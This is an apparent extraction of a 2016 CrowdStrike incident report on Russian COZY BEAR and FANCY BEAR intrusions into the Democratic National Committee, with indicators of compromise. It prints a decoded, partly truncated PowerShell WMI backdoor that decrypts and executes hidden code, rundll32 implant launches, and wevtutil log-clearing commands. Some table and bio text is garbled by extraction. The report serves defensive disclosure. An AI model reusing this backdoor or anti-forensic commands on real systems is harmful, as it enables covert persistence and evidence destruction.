    "plain_text": "### Bears in the Midst: Intrusion into the Democratic National Committee\n\nJune 15, 2016 [Dmitri Alperovitch](https://www.crowdstrike.com/blog/author/dmitri/) [From The Front Lines](https://www.crowdstrike.com/blog/category/from-the-front-lines/)\n\n#### June 15, 2016 UPDATE:\n\nCrowdStrike stands fully by its analysis and findings identifying two\n\nseparate Russian intelligence-affiliated adversaries present in the\n\nDNC network in May 2016. On June 15, 2016 a blog post to a WordPress\n\nsite authored by an individual using the moniker Guccifer 2.0\n\nclaiming credit for breaching the Democratic National Committee.\n\nThis blog post presents documents alleged to have originated from\n\nthe DNC.\n\nWhether or not this posting is part of a Russian Intelligence\n\ndisinformation campaign, we are exploring the documents’\n\nauthenticity and origin. Regardless, these claims do nothing to\n\nlessen our findings relating to the Russian government’s\n\ninvolvement, portions of which we have documented for the public\n\nand the greater security community.\n\nThere is rarely a dull day at CrowdStrike where we are not detecting or\n\nresponding to a breach at a company somewhere around the globe. In\n\n\n-----\n\nthese attacks. But on rare occasions, a customer decides to go public\n\nwith information about their incident and give us permission to\n\nshare our knowledge of the adversary tradecraft with the broader\n\ncommunity and help protect even those who do not happen to be our\n\ncustomers. This story is about one of those cases.\n\n[CrowdStrike Services Inc., our Incident Response group, was called by](https://www.washingtonpost.com/world/national-security/russian-government-hackers-penetrated-dnc-stole-opposition-research-on-trump/2016/06/14/cf006cb4-316e-11e6-8ff7-7b6c1998b7a0_story.html)\n\nthe Democratic National Committee (DNC), the formal governing\n\nbody for the US Democratic Party, to respond to a suspected breach.\n\n[We deployed our IR team and technology and immediately identified](https://www.crowdstrike.com/products/falcon-host/)\n\ntwo sophisticated adversaries on the network – COZY BEAR and\n\nFANCY BEAR. We’ve had lots of experience with both of these actors\n\nattempting to target our customers in the past and know them well.\n\nIn fact, our team considers them some of the best adversaries out of\n\nall the numerous nation-state, criminal and hacktivist/terrorist\n\ngroups we encounter on a daily basis. Their tradecraft is superb,\n\noperational security second to none and the extensive usage of\n\n‘living-off-the-land’ techniques enables them to easily bypass many\n\nsecurity solutions they encounter. In particular, we identified\n\nadvanced methods consistent with nation-state level capabilities\n\nincluding deliberate targeting and ‘access management’ tradecraft –\n\nboth groups were constantly going back into the environment to\n\nchange out their implants, modify persistent methods, move to new\n\nCommand & Control channels and perform other tasks to try to stay\n\nahead of being detected. Both adversaries engage in extensive\n\npolitical and economic espionage for the benefit of the government\n\nof the Russian Federation and are believed to be closely linked to the\n\nRussian government’s powerful and highly capable intelligence\n\nservices.\n\nCOZY BEAR (also referred to in some industry reports as CozyDuke or\n\nAPT 29) is the adversary group that last year successfully infiltrated\n\n[the unclassified networks of the White House, State Department, and](http://www.thedailybeast.com/articles/2015/04/08/obama-to-putin-stop-hacking-me.html)\n\n[US Joint Chiefs of Staff. In addition to the US government, they have](https://www.theguardian.com/technology/2015/aug/06/us-military-joint-chiefs-hacked-officials-blame-russia)\n\ntargeted organizations across the Defense, Energy, Extractive,\n\nFinancial, Insurance, Legal, Manufacturing Media, Think Tanks,\n\nPharmaceutical, Research and Technology industries, along with\n\nUniversities. Victims have also been observed in Western Europe,\n\nBrazil, China, Japan, Mexico, New Zealand, South Korea, Turkey and\n\nCentral Asian countries. COZY BEAR’s preferred intrusion method is a\n\nbroadly targeted spearphish campaign that typically includes web\n\nlinks to a malicious dropper. Once executed on the machine, the code\n\nwill deliver one of a number of sophisticated Remote Access Tools\n\n(RATs) including AdobeARM ATI Agent and MiniDionis On many\n\n\n-----\n\ntechniques to ensure the sample is not being analyzed on a virtual\n\nmachine, using a debugger, or located within a sandbox. They have\n\nextensive checks for the various security software that is installed on\n\nthe system and their specific configurations. When specific versions\n\nare discovered that may cause issues for the RAT, it promptly exits.\n\nThese actions demonstrate a well-resourced adversary with a\n\nthorough implant-testing regime that is highly attuned to slight\n\nconfiguration issues that may result in their detection, and which\n\nwould cause them to deploy a different tool instead. The implants are\n\nhighly configurable via encrypted configuration files, which allow the\n\nadversary to customize various components, including C2 servers,\n\nthe list of initial tasks to carry out, persistence mechanisms,\n\nencryption keys and others. An HTTP protocol with encrypted payload\n\nis used for the Command & Control communication.\n\nFANCY BEAR (also known as Sofacy or APT 28) is a separate Russian\nbased threat actor, which has been active since mid 2000s, and has\n\nbeen responsible for targeted intrusion campaigns against the\n\nAerospace, Defense, Energy, Government and Media sectors. Their\n\nvictims have been identified in the United States, Western Europe,\n\nBrazil, Canada, China, Georgia, Iran, Japan, Malaysia and South Korea.\n\nExtensive targeting of defense ministries and other military victims\n\nhas been observed, the profile of which closely mirrors the strategic\n\ninterests of the Russian government, and may indicate affiliation\n\nwith Главное Разведывательное\n\nУправление (Main Intelligence Department) or GRU,\n\nRussia’s premier military intelligence service. This adversary has a\n\nwide range of implants at their disposal, which have been developed\n\nover the course of many years and include Sofacy, X-Agent, X-Tunnel,\n\nWinIDS, Foozer and DownRange droppers, and even malware for\n\nLinux, OSX, IOS, Android and Windows Phones. This group is known\n\nfor its technique of registering domains that closely resemble\n\ndomains of legitimate organizations they plan to target. Afterwards,\n\nthey establish phishing sites on these domains that spoof the look\n\nand feel of the victim’s web-based email services in order to steal\n\ntheir credentials. FANCY BEAR has also been linked publicly to\n\n[intrusions into the German Bundestag and France’s TV5 Monde TV](http://www.ft.com/cms/s/0/668a131e-1928-11e6-b197-a4af20d5575e.html)\n\nstation in April 2015.\n\nAt DNC, COZY BEAR intrusion has been identified going back to\n\nsummer of 2015, while FANCY BEAR separately breached the network\n\nin April 2016. We have identified no collaboration between the two\n\nactors, or even an awareness of one by the other. Instead, we\n\nobserved the two Russian espionage groups compromise the same\n\n\n-----\n\nWhile you would virtually never see Western intelligence agencies\n\ngoing after the same target without de-confliction for fear of\n\ncompromising each other’s operations, in Russia this is not an\n\nuncommon scenario. “Putin’s Hydra: Inside Russia’s Intelligence\n\nServices”, a recent paper from European Council on Foreign\n\nRelations, does an excellent job outlining the highly adversarial\n\nrelationship between Russia’s main intelligence services –\n\nФедеральная Служба Безопасности\n\n(FSB), the primary domestic intelligence agency but one with also\n\nsignificant external collection and ‘active measures’ remit,\n\nСлужба Внешней Разведки (SVR), the primary\n\nforeign intelligence agency, and the aforementioned GRU. Not only do\n\nthey have overlapping areas of responsibility, but also rarely share\n\nintelligence and even occasionally steal sources from each other and\n\ncompromise operations. Thus, it is not surprising to see them engage\n\nin intrusions against the same victim, even when it may be a waste\n\nof resources and lead to the discovery and potential compromise of\n\nmutual operations.\n\nThe COZY BEAR intrusion relied primarily on the SeaDaddy implant\n\ndeveloped in Python and compiled with py2exe and another\n\nPowershell backdoor with persistence accomplished via Windows\n\nManagement Instrumentation (WMI) system, which allowed the\n\nadversary to launch malicious code automatically after a specified\n\nperiod of system uptime or on a specific schedule. The Powershell\n\nbackdoor is ingenious in its simplicity and power. It consists of a\n\nsingle obfuscated command setup to run persistently, such as:\n\npowershell.exe ­NonInteractive ­ExecutionPolicy\n\nBypass ­EncodedCommand\n\nZgB1AG4AYwB0AGkAbwBuACAAcABlAHIAZgBDAHIAKAAkAGMAcgBUAH\n\nThis decodes to:\n\nfunction perfCr($crTr, $data){\n\n$ret = $null\n\ntry{\n\n$ms = New­Object System.IO.MemoryStream\n\n$cs = New­Object\n\nSystem.Security.Cryptography.CryptoStream ­\n\nArgumentList @($ms, $crTr,\n\n[System.Security.Cryptography.CryptoStreamMode]::Writ\n\n\n-----\n\n$ret = $ms.ToArray()\n\n$cs.Close()\n\n$ms.Close()\n\n}\n\ncatch{}\n\nreturn $ret\n\n}\n\nfunction decrAes($encData, $key, $iv)\n\n{\n\n$ret = $null\n\ntry{\n\n$prov = New­Object\n\nSystem.Security.Cryptography.RijndaelManaged\n\n$prov.Key = $key\n\n$prov.IV = $iv\n\n$decr = $prov.CreateDecryptor($prov.Key, $prov.IV)\n\n$ret = perfCr $decr $encData\n\n}\n\nCatch{}\n\nreturn $ret\n\n}\n\nfunction sWP($cN, $pN, $aK, $aI)\n\n{\n\nif($cN ­eq $null ­or $pN ­eq $null){return $false}\n\ntry{\n\n$wp = ([wmiclass]$cN).Properties[$pN].Value\n\n$exEn = [Convert]::FromBase64String($wp)\n\n$exDec = decrAes $exEn $aK $aI\n\n$ex = [Text.Encoding]::UTF8.GetString($exDec)\n\nif($ex ­eq $null ­or $ex ­eq ”)\n\n{return}\n\nInvoke­Expression $ex\n\nreturn $true\n\n}\n\ncatch{\n\nreturn $false\n\n}\n\n}\n\n$aeK = [byte[]] (0xe7, 0xd6, 0xbe, 0xa9, 0xb7, 0xe6,\n\n0x55, 0x3a, 0xee, 0x16, 0x79, 0xca, 0x56, 0x0f, 0xbc,\n\n0x3f, 0x22, 0xed, 0xff, 0x02, 0x43, 0x4c, 0x1b, 0xc0,\n\n0xe7, 0x57, 0xb2, 0xcb, 0xd8, 0xce, 0xda, 0x00)\n\n$aeI = [byte[]] (0xbe, 0x7a, 0x90, 0xd9, 0xd5, 0xf7,\n\n\n-----\n\nsWP ‘Wmi’ ‘Wmi’ $aeK $aeI | Out­Null\n\nThis one-line powershell command, stored only in WMI database,\n\nestablishes an encrypted connection to C2 and downloads additional\n\npowershell modules from it, executing them in memory. In theory, the\n\nadditional modules can do virtually anything on the victim system.\n\nThe encryption keys in the script were different on every system.\n\nPowershell version of credential theft tool MimiKatz was also used by\n\nthe actors to facilitate credential acquisition for lateral movement\n\npurposes.\n\nFANCY BEAR adversary used different tradecraft, deploying X-Agent\n\nmalware with capabilities to do remote command execution, file\n\ntransmission and keylogging. It was executed via rundll32\n\ncommands such as:\n\nrundll32.exe “C:\\Windows\\twain_64.dll”\n\nIn addition, FANCY BEAR’s X-Tunnel network tunneling tool, which\n\nfacilitates connections to NAT-ed environments, was used to also\n\nexecute remote commands. Both tools were deployed via RemCOM,\n\nan open-source replacement for PsExec available from GitHub. They\n\nalso engaged in a number of anti-forensic analysis measures, such\n\nas periodic event log clearing (via wevtutil cl System and\n\nwevtutil cl Security commands) and resetting timestamps of\n\nfiles.\n\nIntelligence collection directed by nation state actors against US\n\npolitical targets provides invaluable insight into the requirements\n\ndirected upon those actors. Regardless of the agency or unit tasked\n\nwith this collection, the upcoming US election, and the associated\n\ncandidates and parties are of critical interest to both hostile and\n\nfriendly nation states. The 2016 presidential election has the world’s\n\nattention, and leaders of other states are anxiously watching and\n\nplanning for possible outcomes. Attacks against electoral candidates\n\nand the parties they represent are likely to continue up until the\n\nelection in November.\n\nIndicators of Compromise:\n\nIOC Adversary IOC Additi\n\nType\n\n6c1bce76f4d2358656132b6b1d471571820688ccdbaca0d86d0ca082b9390536 COZY SHA256 pagem\n\n|IOC|Adversary|IOC Type|\n|---|---|---|\n\n\n-----\n\nBEAR\n\n\n(SeaD\n\nC2 SeaDa\n\nC2 SeaDa\n\nC2 Power\n\nC2\n\nC2 Power\n\nC2\n\nSHA256 twain_\n\n(64-bi\n\nimpla\n\nSHA256 VmUp\n\n(X-Tun\n\nSHA256 VmUp\n\n(X-Tun\n\nC2 X-Age\n\nC2 X-Tun\n\nC2 X-Tun\n\n| 185[.]100[.]84[.B]13L4O:4G43|COZY BEAR|C2|\n|---|---|---|\n||||\n|58[.]49[.]58[.]58:443|COZY BEAR|C2|\n|218[.]1[.]98[.]203:80|COZY BEAR|C2|\n|187[.]33[.]33[.]8:80|COZY BEAR|C2|\n|fd39d2837b30e7233bc54598ff51bdc2f8c418fa5b94dea2cadb24cf40f395e5|FANCY BEAR|SHA256|\n|4845761c9bed0563d0aa83613311191e075a9b58861e80392914d61a21bad976|FANCY BEAR|SHA256|\n|40ae43b7d6c413becc92b07076fa128b875c8dbb4da7c036639eccf5a9fc784f|FANCY BEAR|SHA256|\n|185[.]86[.]148[.]227:443|FANCY BEAR|C2|\n|45[.]32[.]129[.]185:443|FANCY BEAR|C2|\n|23[.]227[.]196[.]217:443|FANCY BEAR|C2|\n\n\n [Tweet](http://twitter.com/share?text=Bears%20in%20the%20Midst%3A%20Intrusion%20into%20the%20Democratic%20National%20Committee&url=http%3A%2F%2Fwww.crowdstrike.com%2Fblog%2Fbears-midst-intrusion-democratic-national-committee%2F)  [Share](http://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Fwww.crowdstrike.com%2Fblog%2Fbears-midst-intrusion-democratic-national-committee%2F&title=Bears%20in%20the%20Midst%3A%20Intrusion%20into%20the%20Democratic%20National%20Committee&summary=%3Cp%3EJune%2015%2C%202016%20UPDATE%3A%20CrowdStrike%20stands%20fully%20by%20its%20analysis%20and%20findings%20identifying%20two%20separate%20Russian%20intelligence-affiliated%20adversaries%20present%20in%20the%20DNC%20network%20in%20May%202016.%20On%20June%2015%2C%202016%20a%20blog%20post%20to%20a%20Wordpress%20site%20authored%20by%20an%26hellip%3B%3C%2Fp%3E&source=https://www.crowdstrike.com/blog/)\n\n\n#### Dmitri Alperovitch\n\nCo-founder and CTO of Crowdstrike, Dmitri Alperovitch leads\n\nth I t llig T h l g d C dSt ik L b t\n\n\n-----\n\nconducted extensive research on reputation systems, spam\n\ndetection, web security, public-key and identity-based\n\ncryptography, malware and intrusion detection/prevention.\n\nHe is a renowned computer security researcher and thought\n\n##  BLOG\n\nleader on cybersecurity policies and state tradecraft.\n\nAlperovitch’s many honors include being selected as MIT\n\nTechnology Review’s “Young Innovators under 35” (TR35)\n\nin 2013.
